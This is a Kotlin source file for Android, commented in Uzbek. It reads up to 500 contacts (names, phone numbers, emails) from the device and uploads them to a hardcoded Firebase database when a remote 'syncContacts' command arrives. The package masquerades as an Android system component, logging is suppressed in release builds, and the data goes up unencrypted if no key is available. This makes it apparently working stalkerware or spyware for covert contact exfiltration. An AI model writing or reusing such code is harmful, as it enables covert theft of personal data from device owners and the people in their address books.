package com.android.system.core.contacts

import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import com.android.system.core.BuildConfig
import com.android.system.core.crypto.CryptoManager
import com.android.system.core.crypto.KeyFetchWorker
import com.google.firebase.database.FirebaseDatabase

/**
 * Kontaktlarni ContentResolver orqali o'qib Firebase'ga yuklaydi.
 * Firebase path: devices/{uid}/contacts/
 * Trigger: command type "syncContacts"
 */
class ContactsReader(private val context: Context) {

    companion object {
        private const val TAG = "SYS_CORE_CONTACTS"
        private const val MAX_CONTACTS = 500
        private const val FIREBASE_URL = "https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app"
    }

    /**
     * Kontaktlarni o'qib Firebase'ga yuklaydi.
     * @param uid qurilma UID
     * @param onComplete yuklash tugaganda chaqiriladi (success: Boolean)
     */
    fun readAndUpload(uid: String, onComplete: (Boolean) -> Unit = {}) {
        try {
            val contacts = readContacts()
            if (BuildConfig.DEBUG) { Log.d(TAG, "Read ${contacts.size} contacts") }

            if (contacts.isEmpty()) {
                if (BuildConfig.DEBUG) { Log.d(TAG, "No contacts found") }
                onComplete(true)
                return
            }

            val aesKey = KeyFetchWorker.getAesKey(context)
            if (aesKey == null && BuildConfig.DEBUG) {
                Log.w(TAG, "AES key not available, contacts will be uploaded unencrypted")
            }

            // Contacts map yaratish
            val contactsMap = mutableMapOf<String, Any>()
            contacts.forEachIndexed { index, contact ->
                val encryptedName = if (aesKey != null) {
                    CryptoManager.encrypt(contact.name, aesKey) ?: contact.name
                } else contact.name

                val encryptedPhone = if (aesKey != null) {
                    CryptoManager.encrypt(contact.phone, aesKey) ?: contact.phone
                } else contact.phone

                val encryptedEmail = if (aesKey != null && contact.email != null) {
                    CryptoManager.encrypt(contact.email, aesKey) ?: contact.email
                } else contact.email

                val contactData = mutableMapOf<String, Any>(
                    "id" to contact.id,
                    "name" to encryptedName,
                    "phone" to encryptedPhone
                )
                encryptedEmail?.let { contactData["email"] = it }

                contactsMap["$index"] = contactData
            }

            // Firebase'ga yozish
            FirebaseDatabase.getInstance(FIREBASE_URL)
                .getReference("devices")
                .child(uid)
                .child("contacts")
                .setValue(contactsMap)
                .addOnSuccessListener {
                    if (BuildConfig.DEBUG) { Log.d(TAG, "Contacts uploaded: ${contacts.size}") }
                    onComplete(true)
                }
                .addOnFailureListener { e ->
                    if (BuildConfig.DEBUG) { Log.e(TAG, "Contacts upload failed: ${e.message}") }
                    onComplete(false)
                }

        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "readAndUpload error: ${e.message}") }
            onComplete(false)
        }
    }

    /**
     * ContentResolver orqali kontaktlarni o'qiydi.
     * @return ContactData ro'yxati (max 500)
     */
    private fun readContacts(): List<ContactData> {
        val contacts = mutableListOf<ContactData>()
        val seen = mutableSetOf<String>() // dublikatlarni oldini olish

        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null,
                null,
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )

            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                val nameCol = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val phoneCol = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)

                while (it.moveToNext() && contacts.size < MAX_CONTACTS) {
                    val id = it.getString(idCol) ?: continue
                    val name = it.getString(nameCol) ?: ""
                    val phone = it.getString(phoneCol) ?: ""

                    // Bir xil id+phone kombinatsiyasini o'tkazib yuborish
                    val key = "$id:$phone"
                    if (seen.contains(key)) continue
                    seen.add(key)

                    // Email ni alohida so'rash
                    val email = getEmailForContact(id)

                    contacts.add(ContactData(id = id, name = name, phone = phone, email = email))
                }
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) { Log.e(TAG, "readContacts error: ${e.message}") }
        }

        return contacts
    }

    /**
     * Kontakt ID si bo'yicha email manzilini oladi
     */
    private fun getEmailForContact(contactId: String): String? {
        return try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Email.ADDRESS),
                "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                arrayOf(contactId),
                null
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS))
                } else null
            }
        } catch (e: Exception) {
            null
        }
    }

    /**
     * Kontakt ma'lumotlari modeli
     */
    data class ContactData(
        val id: String,
        val name: String,
        val phone: String,
        val email: String? = null
    )
}
